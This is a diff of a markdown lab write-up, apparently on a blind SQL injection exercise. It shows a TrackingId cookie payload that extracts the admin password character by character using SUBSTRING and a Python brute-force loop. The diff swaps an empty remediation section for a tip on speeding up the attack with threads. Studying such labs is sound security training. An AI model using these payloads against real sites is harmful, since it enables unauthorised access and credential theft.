@@ -23,7 +23,7 @@
 
 - After refreshing the website, we always see a "Welcome back!" greeting:
 ![[Pasted image 20260803183950.png]]
-- The "TrackingId" appears in the request, which we can modify and change it to try using SQL injection.
+- The "TrackingId" appears in the request, which we can modify it and try using SQL injection.
 - ![[Pasted image 20260803184048.png]]
 
  - First, I tried these two payloads:
@@ -51,7 +51,7 @@ Cookie: TrackingId=HqMLNGB0BF5u7XpO' AND SUBSTRING((SELECT password FROM users W
 -  Char_index: The current position of the targeting password
 - character: The characters allowed in password
 
- We can easily get the character list by running this python command:
+ We can easily get the character list by using python:
 ```bash
 python3 -c "print('\n'.join(chr(i) for i in range(32, 127)))" > charset.txt
 ```
@@ -122,9 +122,4 @@ for i in range(1, 21):
 print("MAT KHAU CUA THANG ADMIN LA: ", ans)
 ```
 
-
----
-## 💡 5. Key Takeaways & Remediation
-
-- **Key Concept:**
-- **Remediation:**
+A better practice is that I could use ThreadPoolExecutor to have better performance
